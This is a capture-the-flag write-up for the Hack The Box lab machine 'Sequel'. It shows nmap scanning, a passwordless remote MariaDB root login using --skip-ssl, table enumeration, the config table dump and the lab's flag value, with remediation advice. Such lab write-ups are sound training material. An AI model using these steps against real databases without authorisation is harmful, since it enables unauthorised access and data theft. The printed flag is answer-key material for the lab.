# HTB Starting Point — Sequel

**Platform:** Hack The Box — Starting Point Tier 1  
**OS:** Linux  
**Difficulty:** Very Easy  
**Focus:** MySQL enumeration, unauthenticated database access

---

## Summary

Sequel hosts a MariaDB instance exposed on port 3306 and misconfigured to allow unauthenticated root access. The objective is to connect to the database, enumerate its contents, and extract the flag stored in a configuration table.

---

## Reconnaissance

### Nmap

```bash
sudo nmap 10.129.67.21 -sS -sV -sC
```

**Results:**

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Auth Plugin Name: mysql_native_password
```

**Key observations:**

- Only port 3306 is open — no web surface, no SSH
- MariaDB 10.3.27 on Debian 10
- No HTTP service confirmed by manual browser check

The attack surface is entirely the database service.

---

## Initial Access — Unauthenticated MySQL Login

A standard connection attempt fails due to an SSL negotiation error:

```bash
mysql -h 10.129.67.21 -u root
# ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

Adding `--skip-ssl` bypasses the SSL handshake requirement. No password is prompted — the root account has no authentication configured:

```bash
mysql -h 10.129.67.21 -u root --skip-ssl
```

```
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

**Misconfiguration:** The MariaDB root account accepts connections with an empty password from remote hosts. This is a classic insecure default that is often left in place on development or poorly hardened systems.

---

## Enumeration

### List available databases

```sql
SHOW DATABASES;
```

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

The `htb` database stands out as non-standard.

### Select the target database

```sql
USE htb;
```

> **Note:** `-D htb` is a CLI flag used at connection time (e.g. `mysql -u root -D htb`). Inside an active MySQL session, the correct syntax to switch database is `USE htb;`.

### List tables

```sql
SHOW TABLES;
```

```
+-----------------+
| Tables_in_htb   |
+-----------------+
| config          |
| users           |
+-----------------+
```

### Dump the config table

```sql
SELECT * FROM config;
```

```
+----+----------------------+----------------------------------+
| id | name                 | value                            |
+----+----------------------+----------------------------------+
|  1 | timeout              | 60s                              |
|  2 | security             | default                          |
|  3 | auto_logon           | false                            |
|  4 | max_size             | 2M                               |
|  5 | flag                 | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads       | false                            |
|  7 | authentication_method| radius                           |
+----+----------------------+----------------------------------+
```

---

## Flag

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## Vulnerability Summary

|Category|Detail|
|---|---|
|Vulnerability|Unauthenticated remote MySQL root access|
|Root Cause|Empty password on root account, remote connections permitted|
|Impact|Full database read (and write) access without credentials|
|Fix|Require strong password for all accounts; restrict remote access via `bind-address` or firewall rules; enforce SSL|

---

## Key Takeaways

- **Nmap `-sV -sC`** identified the service version and extracted MariaDB banner info in a single pass
- **`--skip-ssl`** is a useful flag when the client and server SSL negotiation fails but the service is otherwise accessible
- **Database enumeration order:** `SHOW DATABASES` → `USE <db>` → `SHOW TABLES` → `SELECT * FROM <table>` — systematic, top-down
- Sensitive data (credentials, flags, API keys) is often stored in tables named `config`, `settings`, or `users` — always check those first